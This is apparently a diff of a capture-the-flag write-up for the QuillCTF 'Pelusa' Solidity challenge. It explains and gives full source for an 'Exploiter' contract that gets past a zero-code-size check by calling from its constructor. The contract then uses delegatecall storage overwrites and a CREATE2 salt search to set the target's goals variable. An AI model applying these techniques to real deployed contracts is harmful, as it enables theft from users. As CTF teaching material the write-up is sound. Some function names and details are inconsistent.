@@ -1,40 +1,68 @@
-# INCOMPLETE, IGNORE FOR NOW
+# [Pelusa](https://quillctf.super.site/challenges/quillctf-challenges/pelusa)
 
-1. Get owner
-2. Write contract with the right logic to pass `passTheBall()` in the constructor; this way codesize will still return 0.
+## Requirements Gathering
 
-    - [x] Code requirements:
-        - [x] Has a function called `handOfGod()` that
-        - [x] Sets the 3rd variable in the function to `2`
-        - [x] Returns uint `22061986`
-    - [x] Compile contract and get bytecode + length
-        0x60a060405234801561001057600080fd5b5073a131ad247055fd2e2aa8b156a11bdec81b9ead9573ffffffffffffffffffffffffffffffffffffffff1660808173ffffffffffffffffffffffffffffffffffffffff1660601b8152505073a131ad247055fd2e2aa8b156a11bdec81b9ead9573ffffffffffffffffffffffffffffffffffffffff1663a50883396040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100b857600080fd5b505af11580156100cc573d6000803e3d6000fd5b5050505060805160601c6104a06100eb600039600050506104a06000f3fe608060405234801561001057600080fd5b50600436106100415760003560e01c80630d8032fe14610046578063478a4be51461006457806356d9731114610082575b600080fd5b61004e6100b2565b60405161005b91906101de565b60405180910390f35b61006c6100da565b6040516100799190610200565b60405180910390f35b61009c6004803603810190610097919061013f565b6100e0565b6040516100a991906101c3565b60405180910390f35b6060604051806080016040528060428152602001610429604291399050600260018190555090565b60015481565b6000816040516100ef9061011d565b6100f991906101c3565b604051809103906000f080158015610115573d6000803e3d6000fd5b509050919050565b610155806102d483390190565b600081359050610139816102bc565b92915050565b600060208284031215610155576101546102a6565b5b60006101638482850161012a565b91505092915050565b61017581610237565b82525050565b60006101868261021b565b6101908185610226565b93506101a0818560208601610273565b6101a9816102ab565b840191505092915050565b6101bd81610269565b82525050565b60006020820190506101d8600083018461016c565b92915050565b600060208201905081810360008301526101f8818461017b565b905092915050565b600060208201905061021560008301846101b4565b92915050565b600081519050919050565b600082825260208201905092915050565b600061024282610249565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b60005b83811015610291578082015181840152602081019050610276565b838111156102a0576000848401525b50505050565b600080fd5b6000601f19601f8301169050919050565b6102c581610237565b81146102d057600080fd5b5056fe608060405234801561001057600080fd5b506040516101553803806101558339818101604052810190610032919061008d565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610108565b600081519050610087816100f1565b92915050565b6000602082840312156100a3576100a26100ec565b5b60006100b184828501610078565b91505092915050565b60006100c5826100cc565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600080fd5b6100fa816100ba565b811461010557600080fd5b50565b603f806101166000396000f3fe6080604052600080fdfea26469706673582212209f27b9a6beb5d91bb173115acd5801d7e6a1004c35c957cbbb84c555ef5b06ca64736f6c63430008070033307830303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303031353061336132a26469706673582212203dfa95d62b696c54c4f57b07e69ed0b10fe66862c5a49ee3f7f470198923338564736f6c63430008070033
-    - [x]. ~~Write deployment bytecode, save full string~~. Get full deployment bytecode by deploying the contract in Remix, which will include initialization bytecode
-    - [x]. ~~Use `cast` to find for what salt will return a contract address that satisfies the condition `uint256(uint160(msg.sender)) % 100 == 10`~~ Run `bash legalHash.sh` with the above bytecode from the expected deployment address
+Given the objective of **Score from 1 to 2 goals for a win.**, we first review the code.
 
-3. Deploy a contract with the function `getBallPossession()` that returns the address of `owner` as calculated in the contract with `passTheBall()`.
+The variable `goals` starts out being set to `1`, but there is no function that references it in the contract. However, we see there is a `delegatecall` operation being done in the `shoot()` contract, and since we know `delegatecall` can change the calling contract's state using the target contract's logic, it suggests that the the call to `handOfGod()` at the **player** address needs to be responsible for changing the state.
 
+Because we know that the `shoot()` function needs to be called, we can start considering the requirements for calling it successfully.
 
+1. `isGoal()` must return `true`.
+    This reveals two sub-requirements:
+        a. The **player** contract must have a function called `getBallPossesssion()`, which returns the `owner` value.
+        b. Becauses the `owner` value is pre-computed when the **Pelusa** contract was deployed, we know we have to compute it independently to make the **player** contract return the correct value.
+2. `player.delegatecall(abi.encodeWithSignature("handOfGod()"))` must be a successful call and its return data must be `22061986`. Lastly, it must contain logic to change the value in its second storage slot to `2`.
+    Note: it needs to change the value in the second storage slot because the first variable in **Pelusa** is marked as `immutable`, so it gets stored directly in the bytecode instead of in storage.
+3. In order to make the above calls, **player** needed to be set. The only way to do so is by making a successful call to `passTheBall()`, but it requires the code length of the caller to be 0 or else will revert. Fortunately, we know that when a contract's constructor calls a function, it still registers as a codesize of `0`.
+    Next, the address of `msg.sender`, when divided by 100, needs to have a remainder of 10. So there needs to be some way of predicting where the contract address will be that will call `passTheBall()` in its constructor.
 
+## Setting up the Contract
+The first step was writing the code that would live at the **player** address. That is below:
 
-[Deploy](https://book.getfoundry.sh/forge/deploying) contract to Anvil:
 ```
-forge create src/Create2PoC.sol:Simple --unlocked --from 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
-```
+contract Exploiter {
+    address immutable Pelusa;
+    address internal player;
+    uint public goals;
+    address game;
 
-Returns
-```
-Deployer: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
-Deployed to: 0x5FbDB2315678afecb367f032d93F642f64180aa3
-Transaction hash: 0x42f2903416a70b0ec15262637d7968964ffa4d0fe3a9c7936d8462bd2540c41c
-```
+    constructor() {
+        Pelusa = 0xa131AD247055FD2e2aA8b156A11bdEc81b9eAD95; // pre-computed address. In practice, we would know where the Pelusa contract was deployed beforehand so would replace this value with the Pelusa address.
+        // saves us the need to import a Pelusa interface
+        address(0xa131AD247055FD2e2aA8b156A11bdEc81b9eAD95).call(abi.encodeWithSignature("passTheBall()"));
+    }
 
-Get bytecode of deployed contract:
-```
-cast code 0x5FbDB2315678afecb367f032d93F642f64180aa3
-```
+    function updateGameAddress(address addr) public {
+        game = addr;
+    }
+    
+    function getBallPossesion() public view returns(address owner) {
+        owner = Game(game).getBallPossesion();
+    }
 
-Returns
+    function handOfGod() public returns(uint256 val) {
+        goals = 2;
+        val = 22061986;
+    }
+}
 ```
-0x6080604052348015600f57600080fd5b506004361060325760003560e01c80630a099f34146037578063793816ec146049575b600080fd5b604760423660046063565b600055565b005b605160005481565b60405190815260200160405180910390f35b600060208284031215607457600080fd5b503591905056fea26469706673582212205da12d50cef843ab4faed82ba13a74f1210584374b4fe5a51bac876e9d3810cb64736f6c63430008110033
-```
+The `Exploiter` code has an identical storage layout as **Pelusa** up to the `goals` variable (I even named them the same thing, although that wasn't necessary). It also has another variable to store the address for the **Game** contract, so that I wouldn't also have to pass the `owner` address in as a dynamic constructor value (because I didn't know how to do that at the time).
+
+It calls `passTheBall()` in its constructor, and the rest of the functions set it up to return the correct values when called by **Pelusa**.
+
+## Calculating the Deployment Address
+
+With the contract compiled into bytecode, we have code that fulfills the first two requirements. Next, it was time to figure out how to deploy the contract to an address that would allow it to pass the second check in `passTheBall()`.
+
+**Note**: copy the `bytecode` from the **Exploiter.json** file, **not** the `deployedBytecode`. Using the latter will cause errors. Read more about how bytecode is used to deploy more bytecode [here](https://medium.com/@kalexotsu/writing-evm-logic-in-opcodes-deploying-opcode-logic-on-chain-205618fee38d).
+
+This looks like a job for the [Assembly instruction `create2`](https://docs.soliditylang.org/en/v0.8.18/yul.html), which deploys a contract at a deterministic address given its bytecode and a salt.
+
+The rest of this step occurs off-chain. I wrote a script that uses [Foundry's `cast create2`](https://book.getfoundry.sh/reference/cast/cast-create2?highlight=create2#cast-create2) command to cycle through addresses until it found a salt value that met the criteria.
+
+The `create2` instruction needs to be called from a contract, so I set one up called **ExploiterDeployer** that takes the bytecode and the salt as arguments and deploys `Exploiter`.
+
+## Testing
+
+Putting it all together, the test file sets up the **Pelusa**, **ExploiterDeployer**, and **Game** contract, deploys `Exploiter` through **ExploiterDeployer**, and calls `shoot()`. The `goals()` variable returns `true` after doing so.
